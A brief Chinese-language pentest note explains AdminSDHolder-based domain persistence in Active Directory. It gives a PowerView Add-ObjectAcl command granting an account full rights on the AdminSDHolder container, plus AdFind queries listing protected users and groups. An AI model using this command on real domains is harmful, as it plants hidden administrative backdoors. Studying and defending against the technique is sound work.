# Admin SDHolder  
## 简述  
Admin SDHolder是一种域权限维持的技术，
## 基础  
AdminSDHolder 是一个特殊的AD容器  ，用于受保护的AD账号和组的模板  

AD 域会采用 AdminSDHolder对象的ACL并且定期应用AD账户和组，防止被修改。  

受保护的AD账户和组的 AdminCount 属性为 1    



这个在渗透测试当中一般用于权限维持  

当可以将用户添加到这个容器当中的时候，在容器当中的用户虽然没有域管理员的权限但是却有 域管理员的功能  

比如添加域管理员等。



## 特殊   

对用于添加AdminSDHolder的权限  

```
Import-Module .\PowerView.ps1
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName xx -Verbose -Rights All
```

adfind 寻找 受保护的用户 

```
Adfind.exe -b DC=domain,DC=com -f "&(objectcategory=person)(samaccountname=*)(admincount=1)" -dn
```

adfind寻找 ad受保护的组  

```
Adfind.exe -b DC=domain,DC=com -f "&(objectcategory=group)(admincount=1)" -dn
```







## refer

 https://www.redteaming.top/2020/02/24/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94AdminSDHolder/

https://cloud.tencent.com/developer/news/415606

[AdminHolder](https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/plan/security-best-practices/reducing-the-active-directory-attack-surface)

